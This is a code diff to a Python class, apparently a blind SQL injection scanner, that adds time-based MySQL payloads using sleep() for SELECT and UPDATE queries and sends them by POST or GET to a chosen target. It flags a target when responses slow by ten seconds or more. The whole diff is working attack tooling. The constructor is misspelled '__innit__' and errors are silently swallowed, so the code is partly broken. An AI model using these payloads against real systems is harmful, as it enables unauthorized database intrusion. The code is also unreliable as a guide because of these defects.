@@ -6,9 +6,16 @@ class SavageSQLInjection(object):
     def __innit__(self, target=None, fields=None, method=None):
         self.payload = [
             {
-                'description' : 'trying MySQL select time based attack',
-                'payload' : "1' * sleep(5) #",
-                'dbms' : 'mysql'
+                'description' : 'MySQL SELECT time based attack',
+                'payload' : "1' OR 0=sleep(11) LIMIT 1 #",
+                'dbms' : 'mysql',
+                'type' : 'SELECT'
+            },
+            {
+                'description' : 'MySQL UPDATE time based attack',
+                'payload' : "1' * sleep(11) * '1",
+                'dbms' : 'mysql',
+                'type' : 'UPDATE'
             }
         ]
         if target:
@@ -49,9 +56,15 @@ class SavageSQLInjection(object):
                             data[secondfield] = "asd"
                     start = time.time()
                     if self.method == "post":
-                        r = requests.post(url=self.target, data=data)
+                        try:
+                            r = requests.post(url=self.target, data=data, timeout =12)
+                        except:
+                            None
                     else:
-                        r = requests.get(url=self.target, params=data)
+                        try:
+                            r = requests.get(url=self.target, params=data, timeout = 12)
+                        except:
+                            None
                     end = time.time()
                     elapsed = end - start
                     if elapsed - baseline >= 10:
